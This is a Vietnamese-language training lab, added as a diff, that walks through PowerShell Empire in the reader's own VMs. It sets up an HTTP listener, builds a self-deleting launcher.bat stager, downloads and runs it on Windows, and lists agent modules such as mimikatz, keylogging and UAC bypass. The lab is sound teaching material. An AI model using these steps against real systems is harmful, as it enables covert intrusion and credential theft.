@@ -1568,3 +1568,1082 @@ Một thư viện `C#` tuyệt vời khác là Rubeus (chúng ta sẽ tìm hiể
 
 Như chúng ta đã thấy, Sliver là một công cụ mạnh mẽ khác dành cho kiểm thử xâm nhập (và tấn công giả lập). Tính linh hoạt của công cụ cho phép chúng ta dễ dàng tải các thư viện của bên thứ ba và trích xuất thông tin (Metasploit hiện cũng có thể làm được điều này). Một trong những tính năng tuyệt vời nhất là chức năng chơi nhiều người.
 
+# Lab 2.4. Empire
+
+## Mục tiêu
+
+Để sử dụng PowerShell Empire tạo trình lắng nghe trên máy ảo Slingshot Linux và các tác nhân trên máy Windows của bạn, cần cả tác nhân có quyền hạn thấp và tác nhân có quyền hạn cao.
+
+Để xem lại các tính năng OpSec Safe của Empire.
+
+Sử dụng các mô-đun của Empire để cướp bóc một cỗ máy mục tiêu nhằm thu thập thông tin hữu ích.
+
+Sử dụng Empire `privesc/powerup/allchecks` để tìm kiếm các lỗ hổng leo thang đặc quyền cục bộ.
+
+Sử dụng Empire để lừa người dùng vượt qua Kiểm soát Tài khoản Người dùng (UAC) nhằm giành quyền truy cập cao hơn.
+
+Để trích xuất các mã băm từ mục tiêu bằng cách sử dụn  mô-đun `powerdump*` của Empire (Dấu `*` cho biết chúng ta cần một tiến trình có đặc quyền cao, còn được gọi là tiến trình có tính toàn vẹn cao, để chạy mô-đun này).
+
+Tiến hành quét cổng từ một tác nhân Empire.
+
+## Thiết lập phòng thí nghiệm
+
+Các máy ảo được sử dụng:
+
+- Slingshot Linux.
+
+- Windows 10.
+
+Để thực hiện bài thực hành này, hãy đảm bảo rằng bạn có thể ping từ máy ảo Slingshot Linux đến máy tính Windows của mình và ngược lại.
+
+```bash
+ping WINDOWS_ETHERNET0_ADDRESS
+# Thay thế WINDOWS_ETHERNET0_ADDRESS bằng địa chỉ cục bộ của máy ảo Windows của bạn.
+ping LINUX_ETH0_ADDRESS
+# Thay thế LINUX_ETH0_ADDRESS ằng địa chỉ của giao diện eth0 trên máy ảo Linux của bạn.
+```
+
+## Hướng dẫn thực hành từng bước
+
+### 1. Khởi đầu Empire
+
+Hãy bắt đầu bằng cách chuyển đến thư mục cài đặt Empire trên máy ảo Slingshot:
+
+```bash
+cd /opt/empire
+```
+
+Chúng ta cần khởi động máy chủ Empire. Chúng ta sẽ làm điều đó bằng cách chạy máy chủ Empire với quyền root.
+
+```bash
+sudo ./ps-empire server
+```
+
+![alt text](IMG/LAB2/LAB2.4/image.png)
+
+```bash
+root@slingshot:/opt/empire# sudo ./ps-empire server
+[*] Loading default config
+[*] Loading bypasses from: /opt/empire/empire/server/bypasses/
+[*] Loading stagers from: /opt/empire/empire/server/stagers/
+[*] Loading modules from: /opt/empire/empire/server/modules/
+[*] Loading listeners from: /opt/empire/empire/server/listeners/
+[*] Loading malleable profiles from: /opt/empire/empire/server/data/profiles
+[*] Searching for plugins at /opt/empire/empire/server/plugins/
+[*] Initializing plugin...
+[*] Doing custom initialization...
+[*] Loading websockify server plugin
+[*] Registering plugin with menu...
+[*] Initializing plugin...
+[*] Doing custom initialization...
+[*] Loading Empire C# server plugin
+[*] Registering plugin with menu...
+[*] Initializing plugin...
+[*] Doing custom initialization...
+[*] Loading Empire reverseshell server plugin
+[*] Registering plugin with menu...
+[*] Empire starting up...
+[*] Starting Empire RESTful API on 0.0.0.0:1337
+[*] Starting Empire SocketIO on 0.0.0.0:5000
+[*] Testing APIs
+[+] Empire RESTful API successfully started
+[+] test-nuvq connected to socketio
+[+] Empire SocketIO successfully started
+[*] Cleaning up test user
+[+] Client disconnected from socketio
+[+] Plugin csharpserver ran successfully!
+[*] Compiler ready
+Server > 
+EMPIRE TEAM SERVER | 0 Agent(s) | 0 Listener(s) | 3 Plugin(s)
+```
+
+Máy chủ đang hoạt động, hãy mở một cửa sổ terminal mới và kết nối với máy chủ (vẫn là máy đó nhưng mà không root trước).
+
+```bash
+cd /opt/empire
+sudo ./ps-empire client
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-1.png)
+
+Chúng ta sẽ bắt đầu bằng cách xem danh sách các lệnh có sẵn trong khung Empire bằng cách gõ `help` và nhấn Enter.
+
+```bash
+help
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-2.png)
+
+Tại đây, bạn có thể thấy các lệnh như `agents` (hiển thị chi tiết về các tác nhân hiện đang được quản lý), `listeners` (cho phép bạn cấu hình và điều khiển trình lắng nghe) và `usemodule` (cho phép bạn chạy một mô-đun thông qua tác nhân trên một máy bị xâm nhập).
+
+### 2. Cấu hình trình lắng nghe
+
+Trước tiên, chúng ta cần cấu hình trình lắng nghe và triển khai tác nhân.
+
+Chúng ta hãy bắt đầu bằng cách lập danh sách người nghe:
+
+```bash
+listeners
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-3.png)
+
+Vì chúng ta chưa cấu hình trình lắng nghe nào, nên hiện tại sẽ không có trình lắng nghe nào đang hoạt động. Nhưng hãy lưu ý rằng lời nhắc của bạn đã thay đổi thành ngữ cảnh `listeners` cho phép chúng ta cấu hình và khởi động một trình lắng nghe sẽ chờ các cuộc gọi lại từ các tác nhân Empire.
+
+Hãy cùng xem lại các lệnh mà chúng ta có trong ngữ cảnh trình lắng nghe. Gõ `help` và nhấn Enter.
+
+![alt text](IMG/LAB2/LAB2.4/image-4.png)
+
+Hãy quay lại và cấu hình trình lắng nghe.
+
+```bash
+back
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-5.png)
+
+Để khởi động một trình lắng nghe, chúng ta sử dụng lệnh `uselistener`, theo sau là loại trình lắng nghe mà chúng ta muốn sử dụng. Để xem danh sách các loại trình lắng nghe, hãy nhập `uselistener`(có dấu cách ở cuối) nhưng KHÔNG NHẤN ENTER. Bạn sẽ thấy danh sách các trình lắng nghe có sẵn.
+
+![alt text](IMG/LAB2/LAB2.4/image-6.png)
+
+Trong bài thực hành này, chúng ta sẽ sử dụng loại `listener http`, hỗ trợ cả HTTP và HTTPS. Và ngay cả khi chúng ta sử dụng HTTP, quá trình giao tiếp vẫn được mã hóa bằng các khóa mã hóa duy nhất do Empire tạo ra. Hãy cấu hình một listener HTTP, chuyển sang ngữ cảnh của nó và lấy thông tin về nó.
+
+```bash
+uselistener http
+```
+
+```bash
+(Empire) > uselistener http
+
+ Author       @harmj0y
+ Description  Starts a http[s] listener (PowerShell or Python) that uses a GET/POST
+              approach.
+ Name         HTTP[S]
+
+
+┌Record Options────┬─────────────────────────────────────┬──────────┬─────────────────────────────────────┐
+│ Name             │ Value                               │ Required │ Description                         │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ BindIP           │ 0.0.0.0                             │ True     │ The IP to bind to on the control    │
+│                  │                                     │          │ server.                             │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ CertPath         │                                     │ False    │ Certificate path for https          │
+│                  │                                     │          │ listeners.                          │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ Cookie           │ vGuLdYhUK                           │ False    │ Custom Cookie Name                  │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ DefaultDelay     │ 5                                   │ True     │ Agent delay/reach back interval (in │
+│                  │                                     │          │ seconds).                           │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ DefaultJitter    │ 0.0                                 │ True     │ Jitter in agent reachback interval  │
+│                  │                                     │          │ (0.0-1.0).                          │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ DefaultLostLimit │ 60                                  │ True     │ Number of missed checkins before    │
+│                  │                                     │          │ exiting                             │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ DefaultProfile   │ /admin/get.php,/news.php,/login/pro │ True     │ Default communication profile for   │
+│                  │ cess.php|Mozilla/5.0 (Windows NT    │          │ the agent.                          │
+│                  │ 6.1; WOW64; Trident/7.0; rv:11.0)   │          │                                     │
+│                  │ like Gecko                          │          │                                     │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ Headers          │ Server:Microsoft-IIS/7.5            │ True     │ Headers for the control server.     │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ Host             │ http://10.130.10.128                │ True     │ Hostname/IP for staging.            │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ JA3_Evasion      │ False                               │ True     │ Randomly generate a JA3/S signature │
+│                  │                                     │          │ using TLS ciphers.                  │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ KillDate         │                                     │ False    │ Date for the listener to exit       │
+│                  │                                     │          │ (MM/dd/yyyy).                       │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ Launcher         │ powershell -noP -sta -w 1 -enc      │ True     │ Launcher string.                    │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ Name             │ http                                │ True     │ Name for the listener.              │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ Port             │                                     │ True     │ Port for the listener.              │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ Proxy            │ default                             │ False    │ Proxy to use for request (default,  │
+│                  │                                     │          │ none, or other).                    │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ ProxyCreds       │ default                             │ False    │ Proxy credentials                   │
+│                  │                                     │          │ ([domain\]username:password) to use │
+│                  │                                     │          │ for request (default, none, or      │
+│                  │                                     │          │ other).                             │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ SlackURL         │                                     │ False    │ Your Slack Incoming Webhook URL to  │
+│                  │                                     │          │ communicate with your Slack         │
+│                  │                                     │          │ instance.                           │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ StagerURI        │                                     │ False    │ URI for the stager. Must use        │
+│                  │                                     │          │ /download/. Example:                │
+│                  │                                     │          │ /download/stager.php                │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ StagingKey       │ Y&+L*#Jl|s<r)dqhcHvx4kM@]ODi0K(b    │ True     │ Staging key for initial agent       │
+│                  │                                     │          │ negotiation.                        │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ UserAgent        │ default                             │ False    │ User-agent string to use for the    │
+│                  │                                     │          │ staging request (default, none, or  │
+│                  │                                     │          │ other).                             │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ WorkingHours     │                                     │ False    │ Hours for the agent to operate      │
+│                  │                                     │          │ (09:00-17:00).                      │
+└──────────────────┴─────────────────────────────────────┴──────────┴─────────────────────────────────────┘
+
+(Empire: uselistener/http) >
+```
+
+Hãy cùng xem xét các tùy chọn mà chúng ta có thể sử dụng với trình lắng nghe này.
+
+Hãy lưu ý những lựa chọn thú vị sau đây:
+
+- KillDate - thời điểm sau đó trình nghe sẽ ngừng hoạt động.
+
+- StagingKey - Một StagingKey giả ngẫu nhiên dùng để mã hóa thông tin liên lạc giữa tác nhân và người nghe.
+
+- Giờ làm việc - để giới hạn thời gian mà các nhân viên sẽ chủ động gọi lại cho người nghe.
+
+- DefaultDelay - các tác nhân hoạt động bất đồng bộ và DefaultDelay quy định tần suất tác nhân sẽ kiểm tra trạng thái.
+
+Bạn cũng có thể thấy rằng đây `DefaultDelay` là `5` giây, có nghĩa là các tác nhân sẽ gửi yêu cầu lấy thêm lệnh về trình lắng nghe cứ sau mỗi năm giây.
+
+Cuối cùng, xin lưu ý rằng Host được thiết lập mặc định là địa chỉ IP Linux của bạn và trình lắng nghe sẽ sử dụng cổng TCP 80.
+
+Hãy giảm thời gian giữa các lần gọi lại từ tác nhân của chúng ta, từ mặc định là năm giây xuống còn một giây, vì điều này sẽ giúp tác nhân phản hồi nhanh hơn trong bài thực hành này. Ngoài ra, máy chủ của chúng ta đã chạy máy chủ web, vì vậy hãy sử dụng cổng 9999 cho bài thực hành này.
+
+Vui lòng thiết lập các tùy chọn sau:
+
+
+- `DefaultDelay` đến 1.
+
+- `Port` đến 9999.
+
+- `Host` đến http://LINUX_ETH0_ADDRESS :9999.
+
+```bash
+set DefaultDelay 1
+set Port 9999
+set Host http://10.130.10.128:9999
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-7.png)
+
+Sử dụng công cụ `options` này để xác minh cài đặt của chúng tôi.
+
+```bash
+options
+```
+
+```bash
+(Empire: uselistener/http) > options
+
+┌Record Options────┬─────────────────────────────────────┬──────────┬─────────────────────────────────────┐
+│ Name             │ Value                               │ Required │ Description                         │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ BindIP           │ 0.0.0.0                             │ True     │ The IP to bind to on the control    │
+│                  │                                     │          │ server.                             │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ CertPath         │                                     │ False    │ Certificate path for https          │
+│                  │                                     │          │ listeners.                          │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ Cookie           │ vGuLdYhUK                           │ False    │ Custom Cookie Name                  │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ DefaultDelay     │ 1                                   │ True     │ Agent delay/reach back interval (in │
+│                  │                                     │          │ seconds).                           │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ DefaultJitter    │ 0.0                                 │ True     │ Jitter in agent reachback interval  │
+│                  │                                     │          │ (0.0-1.0).                          │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ DefaultLostLimit │ 60                                  │ True     │ Number of missed checkins before    │
+│                  │                                     │          │ exiting                             │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ DefaultProfile   │ /admin/get.php,/news.php,/login/pro │ True     │ Default communication profile for   │
+│                  │ cess.php|Mozilla/5.0 (Windows NT    │          │ the agent.                          │
+│                  │ 6.1; WOW64; Trident/7.0; rv:11.0)   │          │                                     │
+│                  │ like Gecko                          │          │                                     │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ Headers          │ Server:Microsoft-IIS/7.5            │ True     │ Headers for the control server.     │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ Host             │ http://10.130.10.128:9999           │ True     │ Hostname/IP for staging.            │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ JA3_Evasion      │ False                               │ True     │ Randomly generate a JA3/S signature │
+│                  │                                     │          │ using TLS ciphers.                  │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ KillDate         │                                     │ False    │ Date for the listener to exit       │
+│                  │                                     │          │ (MM/dd/yyyy).                       │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ Launcher         │ powershell -noP -sta -w 1 -enc      │ True     │ Launcher string.                    │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ Name             │ http                                │ True     │ Name for the listener.              │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ Port             │ 9999                                │ True     │ Port for the listener.              │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ Proxy            │ default                             │ False    │ Proxy to use for request (default,  │
+│                  │                                     │          │ none, or other).                    │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ ProxyCreds       │ default                             │ False    │ Proxy credentials                   │
+│                  │                                     │          │ ([domain\]username:password) to use │
+│                  │                                     │          │ for request (default, none, or      │
+│                  │                                     │          │ other).                             │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ SlackURL         │                                     │ False    │ Your Slack Incoming Webhook URL to  │
+│                  │                                     │          │ communicate with your Slack         │
+│                  │                                     │          │ instance.                           │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ StagerURI        │                                     │ False    │ URI for the stager. Must use        │
+│                  │                                     │          │ /download/. Example:                │
+│                  │                                     │          │ /download/stager.php                │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ StagingKey       │ Y&+L*#Jl|s<r)dqhcHvx4kM@]ODi0K(b    │ True     │ Staging key for initial agent       │
+│                  │                                     │          │ negotiation.                        │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ UserAgent        │ default                             │ False    │ User-agent string to use for the    │
+│                  │                                     │          │ staging request (default, none, or  │
+│                  │                                     │          │ other).                             │
+├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
+│ WorkingHours     │                                     │ False    │ Hours for the agent to operate      │
+│                  │                                     │          │ (09:00-17:00).                      │
+└──────────────────┴─────────────────────────────────────┴──────────┴─────────────────────────────────────┘
+
+(Empire: uselistener/http) >
+```
+
+Chúng ta sẽ sử dụng lệnh `execute` này để khởi động trình lắng nghe của mình:
+
+```bash
+execute
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-8.png)
+
+Giờ chúng ta có thể kiểm tra trình lắng nghe bằng cách chạy lệnh `listeners`:
+
+![alt text](IMG/LAB2/LAB2.4/image-9.png)
+
+### 3. Khai thác một agent
+
+Bây giờ chúng ta cần tạo và triển khai một tác nhân, điều này được thực hiện bằng lệnh `usestager`. Để xem các loại trình cài đặt khác nhau mà chúng ta có sẵn để tải tác nhân lên máy nạn nhân, hãy gõ usestager (và dấu cách), sau đó sử dụng các phím mũi tên để xem các trình cài đặt có sẵn.
+
+```bash
+usestager
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-10.png)
+
+Kết quả đầy đủ:
+
+```bash
+(Empire: listeners) > usestager
+                                 windows/csharp_exe
+                                 windows/wmic
+                                 windows/ms16-051
+                                 windows/launcher_bat
+                                 windows/macroless_msword
+                                 windows/backdoorLnkMacro
+                                 windows/teensy
+                                 windows/launcher_sct
+                                 windows/bunny
+                                 windows/launcher_lnk
+                                 windows/nim
+                                 windows/dll
+                                 windows/launcher_xml
+                                 windows/launcher_vbs
+                                 windows/hta
+                                 windows/shellcode
+                                 windows/reverseshell
+                                 windows/macro
+                                 windows/ducky
+                                 windows/cmd_exec
+                                 multi/war
+                                 multi/bash
+                                 multi/pyinstaller
+                                 multi/macro
+                                 multi/launcher
+                                 osx/pkg
+                                 osx/teensy
+                                 osx/safari_launcher
+                                 osx/application
+                                 osx/macho
+                                 osx/shellcode
+                                 osx/dylib
+                                 osx/dylib
+                                 osx/jar
+                                 osx/applescript
+                                 osx/macro
+                                 osx/launcher
+                                 osx/ducky
+```
+
+Trong bài thực hành này, chúng ta hãy tạo một trình soạn thảo chạy tác nhân thông qua PowerShell từ một tệp .bat của Windows và sau đó xóa tệp .bat đó, một trong những loại tác nhân hữu ích và đáng tin cậy nhất được Empire hỗ trợ.
+
+Chọn đối tượng `windows/launcher_bat` cần thiết lập bằng lệnh `usestager`.
+
+```bash
+usestager windows/launcher_bat
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-11.png)
+
+Hãy cùng xem cấu hình mặc định của trình chuẩn bị sẽ tải tác nhân:
+
+```bash
+options
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-12.png)
+
+Lưu ý rằng tác nhân có khả năng xác thực với máy chủ proxy thông qua biến ProxyCreds.
+
+Trong bài thực hành này, chúng ta sẽ giữ nguyên các thiết lập mặc định hợp lý và hữu ích cho trình soạn thảo.
+
+Chúng ta cần cho trình soạn thảo biết nó sẽ gọi lại trình lắng nghe nào (hiện tại chỉ có một trình lắng nghe đang chạy):
+
+```bash
+set Listener http
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-13.png)
+
+Hãy tạo tệp stager của chúng ta:
+
+```bash
+generate
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-14.png)
+
+Tiếp theo, tại một cửa sổ dòng lệnh Linux riêng biệt, chúng ta hãy chuyển sang` /opt/empire/empire/client/generated-stagers/` và chạy tệp stager thông qua mô-đun `http.server` Python, lắng nghe trên cổng TCP mặc định là 8000.
+
+Tạo một máy chủ web Python để phục vụ trang web vừa tạo của bạn `/opt/empire/empire/client/generated-stagers/launcher.bat`:
+
+```bash
+cd /opt/empire/empire/client/generated-stagers/
+python3 -m http.server
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-15.png)
+
+### 4. Triển khai trình dàn dựng
+
+Để triển khai trình biên dịch thử nghiệm trên Windows, chúng ta hãy sử dụng PowerShell như một trình duyệt dòng lệnh để tải xuống một tập tin.
+
+Nhấp vào biểu tượng PowerShell trên màn hình nền (không phải liên kết có quyền quản trị).
+
+Đầu tiên, hãy khởi chạy PowerShell mà không cần quyền quản trị (bằng cách vào menu Windows, gõ lệnh `PowerShell` và nhấn Enter).
+
+Bây giờ, từ PowerShell, hãy chuyển đến thư mục Desktop của bạn:
+
+```bash
+cd Desktop
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-16.png)
+
+Sau đó chạy lệnh `wget` cmdlet để tải xuống tệp trình chuẩn bị tác nhân.
+
+```bash
+wget http://10.130.10.128:8000/launcher.bat -OutFile launcher.bat
+```
+
+Để đảm bảo tệp stager của bạn đã được tải lên chính xác, hãy chạy `ls` lệnh để kiểm tra kích thước của nó:
+
+```bash
+ls launcher.bat
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-17.png)
+
+Tệp tin phải có độ dài khác 0 byte. Tệp tin có độ dài xấp xỉ 287 byte.
+
+Hãy cùng xem nhanh tệp tin của chúng ta bằng cách sử dụng `Get-Content`.
+
+```bash
+Get-Content launcher.bat
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-18.png)
+
+Cuối cùng, bạn sẽ thấy tệp launcher.bat trên màn hình Desktop của máy tính Windows.
+
+![alt text](IMG/LAB2/LAB2.4/image-19.png)
+
+Tiếp theo, nhấp đúp vào biểu tượng `launcher.bat` trên máy tính của bạn Desktop. Thao tác này sẽ chạy trình biên dịch để tải tác nhân lên máy tính Windows của bạn. Sau khi tác nhân được tải, tệp launcher.bat sẽ biến mất, vì đây là tệp độc hại tự xóa.
+
+Tiếp theo, trên máy Linux của bạn, trong cửa sổ terminal của Empire, bạn sẽ thấy một dấu hiệu cho biết trình lắng nghe đã nhận được thông tin liên lạc từ tác nhân của bạn, với thông báo "New agent" theo sau là một tên tác nhân được tạo ngẫu nhiên.
+
+![alt text](IMG/LAB2/LAB2.4/image-20.png)
+
+### 5. Agent hoạt động
+
+Bây giờ chúng ta hãy xem xét các tác nhân đang hoạt động hiện có:
+
+```bash
+agents
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-21.png)
+
+Bạn sẽ thấy tên của một tác nhân được liệt kê ở đó. Hãy cùng xem danh sách các lệnh của tác nhân.
+
+```bash
+help
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-22.png)
+
+
+Tên ngẫu nhiên giả không tiện lắm, vậy nên chúng ta hãy `rename` đặt tên cho phiên này. Hãy gọi tác nhân đầu tiên là `Agent1`. Sau đó liệt kê các tác nhân của bạn. Lưu ý, bạn phải chạy lệnh `list` này, nếu không bạn sẽ không thể tương tác với tác nhân bằng tên mới (đây là một lỗi).
+
+```bash
+rename 4A179ENU agent1
+list
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-23.png)
+
+Để sử dụng một tác nhân, chúng ta sẽ dùng lệnh `interact`. Hãy chắc chắn rằng bạn đã chạy lệnh list ở bước trước, nếu không bạn sẽ không thể tương tác với tác nhân mới của mình bằng tên mới.
+
+```bash
+interact agent1
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-24.png)
+
+Bây giờ chúng ta hãy xem lại danh sách lệnh của mình:
+
+```bash
+help
+```
+
+```bash
+(Empire: agent1) > help
+
+┌Help Options────┬─────────────────────────────────────┬───────────────────────────────┐
+│ Name           │ Description                         │ Usage                         │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ display        │ Display an agent property           │ display <property_name>       │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ download       │ Tasks an the specified agent to     │ download <file_name>          │
+│                │ download a file.                    │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ help           │ Display the help menu for the       │ help                          │
+│                │ current menu                        │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ history        │ Display last number of task results │ history [<number_tasks>]      │
+│                │ received.                           │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ info           │ Display agent info.                 │ info                          │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ killdate       │ Set an agent's killdate             │ killdate <kill_date>          │
+│                │ (01/01/2020)                        │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ proxy          │ Proxy management menu for           │ proxy                         │
+│                │ configuring agent proxies           │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ script_command │ "Execute a function in the          │ shell_command <script_cmd>    │
+│                │ currently imported PowerShell       │                               │
+│                │ script."                            │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ script_import  │ Uploads a PowerShell script to the  │ script_import                 │
+│                │ server and runs it in memory on the │ <local_script_location>       │
+│                │ agent. Use '-p' for a file          │                               │
+│                │ selection dialog.                   │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ shell          │ Tasks an the specified agent to     │ shell <shell_cmd>             │
+│                │ execute a shell command.            │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ sleep          │ Tasks an the specified agent to     │ sleep <delay> <jitter>        │
+│                │ update delay (s) and jitter (0.0 -  │                               │
+│                │ 1.0)                                │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ update_comms   │ Update the listener for an agent.   │ update_comms <listener_name>  │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ upload         │ Tasks an the specified agent to     │ upload <local_file_directory> │
+│                │ upload a file. Use '-p' for a file  │                               │
+│                │ selection dialog.                   │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ view           │ View specific task and result       │ view <task_id>                │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ vnc            │ Launch a VNC server on the agent    │ vnc                           │
+│                │ and spawn a VNC client              │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ vnc_client     │ Launch a VNC client to a remote     │ vnc_client <address> <port>   │
+│                │ server                              │ <password>                    │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ workinghours   │ Set an agent's working hours        │ workinghours <working_hours>  │
+│                │ (9:00-17:00)                        │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ whoami         │ Tasks an agent to run the shell     │ whoami                        │
+│                │ command 'whoami'                    │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ ps             │ Tasks an agent to run the shell     │ ps                            │
+│                │ command 'ps'                        │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ sc             │ Tasks the agent to run module       │ sc                            │
+│                │ powershell/collection/screenshot.   │                               │
+│                │ Default parameters include: Ratio:  │                               │
+│                │ 80                                  │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ keylog         │ Tasks the agent to run module       │ keylog                        │
+│                │ powershell/collection/keylogger.    │                               │
+│                │ Default parameters include: Sleep:  │                               │
+│                │ 1                                   │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ sherlock       │ Tasks the agent to run module       │ sherlock                      │
+│                │ powershell/privesc/sherlock.        │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ mimikatz       │ Tasks the agent to run module power │ mimikatz                      │
+│                │ shell/credentials/mimikatz/logonpas │                               │
+│                │ swords.                             │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ psinject       │ Tasks the agent to run module       │ psinject <Listener> <ProcId>  │
+│                │ powershell/management/psinject.     │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ revtoself      │ Tasks the agent to run module       │ revtoself                     │
+│                │ powershell/credentials/tokens.      │                               │
+│                │ Default parameters include:         │                               │
+│                │ RevToSelf: True                     │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ shinject       │ Tasks the agent to run module       │ shinject <Listener> <ProcId>  │
+│                │ powershell/management/shinject.     │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ spawn          │ Tasks the agent to run module       │ spawn <Listener>              │
+│                │ powershell/management/spawn.        │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ steal_token    │ Tasks the agent to run module       │ steal_token <ProcessID>       │
+│                │ powershell/credentials/tokens.      │                               │
+│                │ Default parameters include:         │                               │
+│                │ ImpersonateUser: True               │                               │
+├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
+│ bypassuac      │ Tasks the agent to run module power │ bypassuac <Listener>          │
+│                │ shell/privesc/bypassuac_eventvwr.   │                               │
+└────────────────┴─────────────────────────────────────┴───────────────────────────────┘
+```
+
+Ở đây chúng ta có thể thấy các lệnh như `download`, `killdate`, và `shell`. Ngoài ra, để xem các thiết lập liên quan đến tác nhân hiện tại, chúng ta có thể chạy lệnh `info`. Hãy cùng làm điều đó:
+
+```bash
+info
+```
+
+```bash
+(Empire: agent1) > info
+
+┌Agent Options─────┬───────────────────────────────────────────────┐
+│ ID               │ 1                                             │
+├──────────────────┼───────────────────────────────────────────────┤
+│ architecture     │ AMD64                                         │
